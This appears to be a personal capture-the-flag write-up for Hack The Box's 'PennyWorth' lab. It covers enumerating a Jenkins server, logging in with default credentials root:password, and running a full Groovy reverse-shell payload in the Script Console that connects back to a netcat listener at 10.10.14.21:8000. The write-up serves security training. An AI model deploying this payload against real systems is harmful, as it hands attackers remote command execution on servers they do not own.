## Lab Title: PennyWorth
- Date: 2025-08-06
- Duration: ~30 minutes

### Platform: HTB – Starting Point > Tier 1

### 1. Scenario Summary
- Jenkins Shell Access >> Groovy Scripts >> Reverse Shell >> Netcat usage

### 2. Findings
- CVE           >> Common Vulnerabilities and Exposures
- CIA           >> Confidentiality, Integrity, Availability
- Nmap          >> Enumeration
    - `nmap $ip -Pn -sV -p T:8080` >> Jetty 9.4.39.v20210325
    
- Curl          >> To see webcontent
    - `curl -vv http://$ip:8080` >> 
    - Jenkins Version >> 2.289.1
    - Server: Jetty(9.4.39.v20210325)

- Jenkins       >> Tool to automate building/testing/integration/deployment of Softwares
    - It has >>  Jenkins Script Console >> takes Groovy Scripts
    - Provides a `web-based Groovy shell` into the `Jenkins runtime env`

- Goal >> is to have access to `Script Console` in page of Jenkins >> I got via login page of Jenkins with credentials: `root:password`
    - In this shell, I used `reverse shell` payload crafted for Groovy:
        - Payload:
            ```code
                        String host="10.10.14.21";
                        int port=8000;
                        String cmd="/bin/bash";
                        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
                        Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
                        OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())             {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
                        
                        ```
                
        - Before this make sure that on your machine >> you run `nc -lvnp 8000` to accept the connection
        - Then you got `reverse shell` voila >> go to `/root/flag.txt`

### 3. Idea
- Jenkins Shell Access >> Groovy Scripts >> Reverse Shell >> Netcat usage



